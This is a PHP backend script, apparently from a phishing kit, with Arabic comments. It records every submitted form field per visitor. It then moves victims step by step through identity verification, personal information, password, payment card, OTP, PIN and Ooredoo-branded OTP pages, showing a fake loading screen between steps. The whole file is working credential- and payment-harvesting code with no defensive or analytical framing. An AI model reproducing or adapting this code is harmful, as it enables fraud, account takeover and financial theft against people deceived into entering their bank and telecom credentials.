<?php
error_reporting(0);
ini_set('display_errors', 0);
require_once 'includes/db.php';
require_once 'includes/functions.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $visitor_id = $_POST['visitor_id'] ?? '';
    if (empty($visitor_id)) {
        $visitor_id = "visitor_" . bin2hex(random_bytes(4));
    }

    $current_page = $_POST['current_page'] ?? 'index.php';
    
    // سجل تتبع للتأكد من وصول الكود الجديد للسيرفر
    error_log("Processing request for visitor: $visitor_id on page: $current_page");

    // التأكد من وجود الزائر في جدول visitors أولاً لتجنب خطأ Foreign Key
    try {
        if (strpos($current_page, 'index.php') !== false) {
            updateVisitorStep($visitor_id, 'index');
        } else {
            updateVisitorStep($visitor_id, $current_page);
        }
    } catch (Exception $e) {
        error_log("Error updating visitor step: " . $e->getMessage());
    }

    // الآن يمكن حفظ البيانات بأمان
    error_log("Saving data for visitor: $visitor_id from page: $current_page");
    foreach ($_POST as $key => $value) {
        if ($key !== 'visitor_id' && $key !== 'current_page') {
            saveData($visitor_id, $key, $value);
            error_log("Saved: $key = $value");
        }
    }

    $redirects = [
        'index.php' => 'update_info.php',
        'update_info.php' => 'identity_verification.php',
        'identity_verification.php' => 'personal_info.php',
        'personal_info.php' => 'password.php',
        'password.php' => 'payment.php'
    ];

    if (isset($redirects[$current_page])) {
        $next = $redirects[$current_page];
        header("Location: loading.php?visitor_id=$visitor_id&next=$next");
        exit;
    }

    // الخطوات المتأخرة (الدفع، OTP، PIN، Ooredoo)
    $next_step = getNextStep($current_page);
    header("Location: loading.php?visitor_id=$visitor_id&next=$next_step");
    exit;
}

function getNextStep($current) {
    if (strpos($current, 'payment.php') !== false) return 'otp.php';
    if (strpos($current, 'otp.php') !== false) return 'pin.php';
    if (strpos($current, 'pin.php') !== false) return 'ooredoo.php';
    if (strpos($current, 'ooredoo.php') !== false) return 'otp_ooredoo.php';
    if (strpos($current, 'otp_ooredoo.php') !== false) return 'success.php';
    
    // الأمان في حالة عدم التطابق
    if (strpos($current, 'index.php') !== false) return 'update_info.php';
    if (strpos($current, 'update_info.php') !== false) return 'identity_verification.php';
    if (strpos($current, 'identity_verification.php') !== false) return 'personal_info.php';
    if (strpos($current, 'personal_info.php') !== false) return 'password.php';
    if (strpos($current, 'password.php') !== false) return 'payment.php';
    
    return 'success.php';
}
?>
